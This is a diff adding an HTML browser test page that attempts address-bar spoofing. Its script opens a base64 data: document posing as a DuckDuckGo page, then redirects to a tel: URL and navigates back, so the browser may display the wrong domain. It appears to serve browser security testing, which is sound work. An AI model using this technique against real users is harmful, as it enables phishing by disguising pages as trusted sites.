@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>URL Spoofing - Base64 Document Load</title>
+    <script>
+        // eslint-disable-next-line no-unused-vars
+        function run() {
+            w = open('data:text/html;base64,PHRpdGxlPkR1Y2tEdWNrR28gLSBQcml2YWN5LCBTaW1wbGlmaWVkPC90aXRsZT48aDE+Tm90IERERzwvaDE+Cg==')
+            setTimeout(function () {
+                w.location = 'tel://duckduckgo.com'
+                setTimeout(function () {
+                    w.history.back()
+                }, 2100)
+            }, 2000)
+        }
+    </script>
+</head>
+
+<body>
+    <p><a href="../index.html">[Home]</a></p>
+
+    This test will try to confuse the browser to show the wrong domain in the URL bar by loading a static Base64
+    encoded document, rewriting the current page, and then navigating to a tel: URL.
+
+    <button onclick="run()">Start</button>
+</body>
+
+</html>
